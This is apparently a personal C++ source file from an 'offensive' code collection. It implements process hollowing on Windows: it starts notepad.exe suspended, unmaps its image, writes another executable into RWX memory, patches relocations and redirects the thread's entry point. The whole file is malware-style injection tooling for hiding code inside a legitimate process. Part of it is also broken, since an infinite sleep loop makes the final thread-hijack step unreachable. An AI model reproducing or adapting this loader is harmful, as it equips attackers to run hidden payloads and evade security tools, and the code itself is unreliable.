// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

// #include <iostream>
#include <windows.h>
#include <stdio.h>
// #include <winternl.h>

typedef struct BASE_RELOCATION_BLOCK
{
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY
{
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef struct _LSA_UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA
{
	ULONG Length;
	ULONG Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_MODULE
{
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID BaseAddress;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	PVOID Handle;
} CURDIR, *PCURDIR;

typedef struct _STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} ANSI_STRING, *PANSI_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	WORD Flags;
	WORD Length;
	ULONG TimeStamp;
	ANSI_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	PVOID ConsoleHandle;
	ULONG ConsoleFlags;
	PVOID StandardInput;
	PVOID StandardOutput;
	PVOID StandardError;
	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	BOOLEAN Spare;
	HANDLE Mutant;
	PVOID ImageBase;
	PPEB_LDR_DATA LoaderData;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PVOID FastPebLock;
	PVOID FastPebLockRoutine;
	PVOID FastPebUnlockRoutine;
	ULONG EnvironmentUpdateCount;
	PVOID *KernelCallbackTable;
	PVOID EventLogSection;
	PVOID EventLog;
	PVOID FreeList;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[0x2];
	PVOID ReadOnlySharedMemoryBase;
	PVOID ReadOnlySharedMemoryHeap;
	PVOID *ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;
	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;
	BYTE Spare2[0x4];
	LARGE_INTEGER CriticalSectionTimeout;
	ULONG HeapSegmentReserve;
	ULONG HeapSegmentCommit;
	ULONG HeapDeCommitTotalFreeThreshold;
	ULONG HeapDeCommitFreeBlockThreshold;
	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID **ProcessHeaps;
	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	PVOID GdiDCAttributeList;
	PVOID LoaderLock;
	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	ULONG OSBuildNumber;
	ULONG OSPlatformId;
	ULONG ImageSubSystem;
	ULONG ImageSubSystemMajorVersion;
	ULONG ImageSubSystemMinorVersion;
	ULONG GdiHandleBuffer[0x22];
	ULONG PostProcessInitRoutine;
	ULONG TlsExpansionBitmap;
	BYTE TlsExpansionBitmapBits[0x80];
	ULONG SessionId;
} PEB, *PPEB;

typedef struct _PROCESS_BASIC_INFORMATION
{
	PVOID Reserved1;
	PPEB PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef enum _PROCESSINFOCLASS
{
	ProcessBasicInformation = 0,
	ProcessDebugPort = 7,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

// typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
// HANDLE ProcessHandle,
// PROCESSINFOCLASS ProcessInformationClass,
// DWORD_PTR* ProcessInformation,
// ULONG ProcessInformationLength,
// PULONG ReturnLength OPTIONAL
// );

typedef NTSTATUS(WINAPI *_NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength);

typedef NTSTATUS(WINAPI *_NtReadVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	SIZE_T BufferSize,
	PSIZE_T NumberOfBytesRead);

typedef NTSTATUS(WINAPI *NtUnmapViewOfSection)(HANDLE, PVOID);

int main()
{
	_NtQueryInformationProcess __NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess");
	_NtReadVirtualMemory __NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtReadVirtualMemory");

	// // setup
	PROCESS_INFORMATION pi;
	STARTUPINFOA Startup;
	PROCESS_BASIC_INFORMATION pbi; // = new PROCESS_BASIC_INFORMATION();
	ZeroMemory(&Startup, sizeof(Startup));
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&pbi, sizeof(pbi));

	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &Startup, &pi);
	WaitForSingleObject(pi.hProcess, 1 * 1000);
	//
	// create destination process - this is the process to be hollowed out
	// LPSTARTUPINFOA si = new STARTUPINFOA();
	// LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	// PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
	// DWORD returnLenght = 0;
	// CreateProcessA(NULL, (LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);

	// get destination imageBase offset address from the PEB

	__NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);

	// DWORD64 pebImageBaseOffset = (DWORD64)pbi.PebBaseAddress->ImageBase;
	// get destination imageBaseAddress
	LPVOID destImageBase = 0;
	// SIZE_T bytesRead = NULL;
	// printf("destimagebase : %ld\n", destImageBase);
	// printf("peb : %p\n", pbi.PebBaseAddress);
	// DWORD64 pebImageBaseOffset = (DWORD64)pbi.PebBaseAddress + 8;

	// ReadProcessMemory(pi.hProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, 0);

	BYTE temp[0x1000];
	RtlSecureZeroMemory(&temp, sizeof(temp));

	__NtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &temp, 0x1000, 0);

	destImageBase = ((PPEB)temp)->ImageBase;
	// printf("ret = %d", status);

	// printf("destimagebase : %ld\n", (ULONG_PTR)((PPEB)temp)->ImageBase);

	// read source file - this is the file that will be executed inside the hollowed process
	HANDLE sourceFile = CreateFileA("Z:\\git\\offensive_c\\bin\\mype_mainexec.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	DWORD64 sourceFileSize = GetFileSize(sourceFile, NULL);
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);

	// printf("file : %s", sourceFileBytesBuffer);

	// get source image size
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD64)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

	// printf("image : %lld\n", sourceImageSize);

	// carve out the destination image
	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	myNtUnmapViewOfSection(pi.hProcess, destImageBase);

	// allocate new memory in destination image for the source image
	LPVOID newDestImageBase = VirtualAllocEx(pi.hProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	destImageBase = newDestImageBase;

	// get delta between sourceImageBaseAddress and destinationImageBaseAddress
	DWORD64 deltaImageBase = (DWORD64)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

	// set sourceImageBase to destImageBase and copy the source Image headers to the destination image
	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD64)destImageBase;
	WriteProcessMemory(pi.hProcess, destImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// get pointer to first source image section
	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD64)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
	// int err = GetLastError();
	// printf("err: %d\n", err);

	// copy source image sections to destination
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((DWORD64)destImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((DWORD64)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(pi.hProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		sourceImageSection++;
	}

	// get address of the relocation table
	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// patch the binary with relocations
	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE *relocSectionName = (BYTE *)".reloc";
		printf("reloc : %s\n", sourceImageSection->Name);
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
		{
			sourceImageSection++;
			continue;
		}

		DWORD64 sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		DWORD64 relocationOffset = 0;

		while (relocationOffset < relocationTable.Size)
		{
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD64)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD64 relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD64)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				DWORD64 patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD64 patchedBuffer = 0;
				ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD64)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD64), 0);
				patchedBuffer += deltaImageBase;

				WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD64), NULL);
				// int a = GetLastError();
				// printf("reloc : %d\n", a);
			}
		}
	}

	// get context of the dest process thread
	// LPCONTEXT context = new CONTEXT();
	// context->ContextFlags = CONTEXT_INTEGER;

	while (1)
	{
		Sleep(10 * 1000);
	}

	CONTEXT ct;
	GetThreadContext(pi.hThread, &ct);

	// update dest image entry point to the new entry point of the source image and resume dest image thread
	DWORD64 patchedEntryPoint = (DWORD64)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	ct.Rax = patchedEntryPoint;

	SetThreadContext(pi.hThread, &ct);
	ResumeThread(pi.hThread);


	return 0;
}
